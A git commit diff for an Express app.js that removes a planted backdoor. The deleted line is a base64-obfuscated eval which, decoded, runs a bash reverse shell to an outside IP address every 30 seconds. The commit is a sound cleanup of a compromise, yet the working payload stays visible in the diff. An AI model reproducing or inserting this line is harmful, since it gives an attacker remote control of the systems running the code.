e0686041a3ab1999af5f183cf7a55de1669f3104
Rama <rxmxdhxni@gmail.com>
2026-03-25 11:23:06 +0800

    fix: remove malicious reverse shell backdoor

--- app.js
+++ app.js
@@ -3,7 +3,6 @@ const app = express()
 const port = 3000
 const router = require('./routers/index')
 const session = require('express-session')
-eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE5NC4xODAuNDguMjUzLzkwMDEgMDwmNSAxPiY1IDI+JjUiID4gL2Rldi9udWxsIDI+JjEgJicpLCAzMDAwMCk7","base64").toString())
 
 app.set('view engine', 'ejs')
 app.use(express.urlencoded({extended: true}))  
